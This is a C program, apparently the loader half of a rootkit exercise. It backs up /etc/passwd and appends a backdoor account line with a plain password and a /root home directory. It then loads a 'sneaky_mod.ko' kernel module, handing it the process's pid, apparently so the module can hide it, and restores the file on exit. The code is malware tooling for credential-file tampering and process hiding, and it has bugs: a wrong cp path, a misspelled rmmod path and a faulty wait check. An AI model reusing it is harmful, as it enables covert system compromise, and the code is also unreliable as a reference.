#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

void copy_file(const char *source_file, const char *des_file) {
  pid_t pid = fork();
  if (pid < 0) {
    perror("fork() failed!");
    exit(EXIT_FAILURE);
  }
  if (pid == 0) {
    // Child Process
    char *const args[] = {"cp", (char *const)source_file, (char *const)des_file,
                          0};
    int execv_status = execv("bin/cp", args);
    if (execv_status == -1) {
      perror("execv copy failed!");
      exit(EXIT_FAILURE);
    }
  } else {
    // Parent Process
    int wait_status;
    pid_t child_pid = waitpid(pid, &wait_status, 0);
    if (child_pid == -1) {
      perror("Can not waitpid when copy file!");
      exit(EXIT_FAILURE);
    }
  }
}

void print_new_line(const char *file_name, const char *new_line) {
  FILE *file = fopen(file_name, "a");
  fprintf(file, "%s", new_line);
  fclose(file);
}

void load_module(const char *sneaky_mod) {
  pid_t pid = fork();
  if (pid < 0) {
    perror("fork() failed at load_module!");
    exit(EXIT_FAILURE);
  }
  if (pid == 0) {
    // Child Process
    pid_t ppid = getppid();
    char variable_to_pass[30];
    sprintf(variable_to_pass, "sneaky_process_id=%d", (int)ppid);
    char *args[] = {"insmod", (char *)sneaky_mod, variable_to_pass, NULL};
    int execv_status = execv("/sbin/insmod", args);
    if (execv_status == -1) {
      perror("execv failed at load_module!");
      exit(EXIT_FAILURE);
    }
  } else {
    // Parent Process
    int wait_status;
    pid_t child_pid = waitpid(pid, &wait_status, 0);
    if (wait_status == -1) {
      perror("wait_pid failed at load_module!");
      exit(EXIT_FAILURE);
    }
  }
}

void unload_module(const char *sneaky_mod) {
  pid_t pid = fork();
  if (pid < 0) {
    perror("fork() failed at unload_module!");
    exit(EXIT_FAILURE);
  }
  if (pid == 0) {
    // Child Process
    char *args[] = {"rmmod", (char *)sneaky_mod, NULL};
    int execv_status = execv("/sbin/rmsmod", args);
    if (execv_status == -1) {
      perror("execv failed at unload_module!");
      exit(EXIT_FAILURE);
    }
  } else {
    // Parent Process
    int wait_status;
    pid_t child_pid = waitpid(pid, &wait_status, 0);
    if (wait_status == -1) {
      perror("wait_pid failed at unload_module!");
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  const char *etc_file = "/etc/passwd";
  const char *tmp_file = "/tmp/passwd";
  const char *sneaky_mod = "sneaky_mod.ko";
  const char *new_line = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n";

  printf("sneaky_process pid = %d\n", getpid());

  copy_file(etc_file, tmp_file);

  print_new_line(etc_file, new_line);

  load_module(sneaky_mod);

  while (getchar() != 'q') {
  }

  unload_module(sneaky_mod);

  copy_file(tmp_file, etc_file);

  return EXIT_SUCCESS;
}
